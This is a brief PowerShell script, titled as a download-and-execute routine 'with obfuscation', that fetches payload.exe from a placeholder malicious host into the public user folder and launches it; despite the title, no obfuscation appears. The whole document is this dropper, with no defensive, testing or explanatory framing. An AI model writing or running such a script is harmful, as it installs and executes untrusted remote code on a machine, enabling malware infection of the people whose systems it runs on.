# Download and Execute Script with Obfuscation
$url = "http://malicious-site.com/payload.exe"
$path = "C:\Users\Public\payload.exe"

Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path
